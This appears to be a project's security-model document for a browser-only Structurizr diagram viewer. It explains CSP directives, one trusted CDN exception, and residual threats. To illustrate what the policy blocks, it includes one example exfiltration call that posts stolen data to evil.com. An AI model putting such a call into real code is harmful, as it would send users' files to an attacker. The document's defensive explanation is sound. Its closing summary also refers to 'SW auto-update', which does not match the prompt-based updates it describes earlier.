# Security model

This is a view-only PWA. The security goals, in priority order:

1. Files the user picks must not leave their browser.
2. A compromised build (e.g. via a poisoned dependency or an attacker with push access to this repo) should not be able to exfiltrate those files.
3. Reasonable defence-in-depth against unrelated web threats (clickjacking, MIME sniffing, base-URL hijack, form posting).

## What protects user files

The **central guarantee** is `connect-src 'self'` in the Content-Security-Policy. This blocks every outbound network sink — `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon` — to any origin other than the page's own. The CSP is set in three places:

- The parent React app, via a `<meta http-equiv="Content-Security-Policy">` tag in [index.html](./index.html).
- The hidden WASM-parser iframe (`/wasm-host/parser-bootstrap.html`), patched by [scripts/copy-assets.mjs](./scripts/copy-assets.mjs) at vendor time.
- The diagram-renderer iframe (`/diagram-viewer/DiagramViewer.html`), same.

CSP does not cascade across iframe boundaries — each document is constrained only by its own CSP — which is why all three pages need their own meta tag.

Even if an attacker injected `fetch('https://evil.com', { method: 'POST', body: stolen })`, the browser would block the request and log a CSP violation. The user's workspace files have no path off the machine.

The parent CSP is also tight on script and style sources (no `'unsafe-inline'`, no `'unsafe-eval'`). The iframe CSPs are looser on those because the vendored jQuery / JointJS / Structurizr JS uses inline `<script>` blocks and `Function()`-based evaluation; rewriting that vendor code would diverge it from upstream. The relaxation is only safe in the presence of the strict `connect-src 'self'` — without that, `'unsafe-inline'` would be a real exfiltration channel.

### One narrow exception: `https://static.structurizr.com`

The diagram-renderer iframe's `connect-src` and `img-src` allow `https://static.structurizr.com`. Structurizr workspaces routinely reference theme files there (e.g. `https://static.structurizr.com/themes/default/theme.json`); without the carve-out, the renderer logs *"Could not load theme from … ; error 0"* and falls back to ugly defaults.

This is a deliberate widening of the trust boundary by exactly one origin. We already trust the Structurizr project for the WASM parser and JointJS-based renderer we vendor from their codebase — trusting their CDN for theme JSON is consistent with that. The exfiltration impact is bounded: a compromised build can only post data to `static.structurizr.com`, which would require either compromising that specific domain or its DNS. Both are realistic threat scenarios for a nation-state attacker, neither for the threat model this app is sized to.

The service worker also caches theme responses (`CacheFirst`, 30 days), so themes work offline once seen.

## Other CSP directives, briefly

| Directive | Purpose |
|---|---|
| `default-src 'self'` | Whitelist same-origin for everything not specifically listed. |
| `frame-src 'self'` | Iframes can only load same-origin pages. |
| `frame-ancestors 'self'` | This page cannot be embedded by other origins (anti-clickjack). |
| `base-uri 'self'` | Prevents `<base>` injection from redirecting all relative URLs. |
| `form-action 'none'` | No `<form>` can submit anywhere. |
| `object-src 'none'` | No `<object>`, `<embed>`, or legacy plugin loads. |
| `worker-src 'self'` | Service worker / web worker scripts must be same-origin. |
| `img-src 'self' data: blob:` | Allows the data-URI thumbnails generated by the renderer. |
| `wasm-unsafe-eval` | Required for `WebAssembly.instantiateStreaming` to compile the parser. |

`Referrer-Policy: strict-origin-when-cross-origin` is also set via meta tag, so outbound link clicks don't leak the workspace name in the path.

## What this *does not* protect against

Honest list:

- **Browser extensions** with "access to all sites." Any such extension can read the DOM, intercept `fetch` responses, and read FileSystem Access API contents. CSP applies to the page, not to extension content scripts. Mitigation: don't run untrusted extensions while viewing sensitive workspaces.
- **Account compromise on the publisher side.** If someone with push access to this repo lands a malicious commit, the next deploy will serve it. CSP limits the *blast radius* (no exfiltration), but malicious code could still mislead the user, modify what they see, or trash the SW cache. Mitigation: enable 2FA + branch protection + signed commits on the GitHub repo.
- **Silent service-worker updates.** *(Mitigated.)* The SW is registered with `registerType: 'prompt'` rather than `'autoUpdate'` — when a new version of the PWA is published, the new SW is downloaded but parks in the "waiting" state. The running version stays in place until the user explicitly clicks the **Update** button rendered by [`UpdatePrompt.tsx`](./src/components/UpdatePrompt.tsx). A compromised deploy therefore cannot replace the code on a user's device without their knowledge. Users wanting an even stronger pin should use the offline bundle (`pnpm build` → ship `dist/`), which freezes the code at a known SHA256.
- **Network-level interception.** GitHub Pages serves over HTTPS, so this is not a realistic threat against the initial download; the SW caches the assets afterwards. Still, the project does not currently publish per-release SHA256 hashes for paranoid verification.
- **The macOS/JVM upstream itself.** This PWA reuses a 15 MB GraalVM-compiled WASM parser and ~3 MB of JointJS/jQuery/Structurizr JS, all vendored from the Structurize macOS app. Compromise there propagates here. We pin the versions with the lockfile and the committed `public/wasm-host/`, `public/diagram-viewer/`, but do not currently audit upstream changes diff-by-diff.

## Threat model summary

If you would be comfortable running [`structurizr/lite`](https://docs.structurizr.com/lite) in Docker against the same workspace, this PWA is a comparable security posture: the same JS runs in a same-origin browser context, with the same `fetch`/`File System Access` capabilities. The PWA is harder for an attacker to weaponise (no long-running server process, browser sandbox, strict CSP) but easier to update silently (SW auto-update vs. explicit `docker pull`).

For genuinely sensitive material (export-controlled IP, classified diagrams) prefer the native macOS Structurize app — OS-level signing, notarisation, and process sandboxing are stronger guarantees than anything a browser can offer.
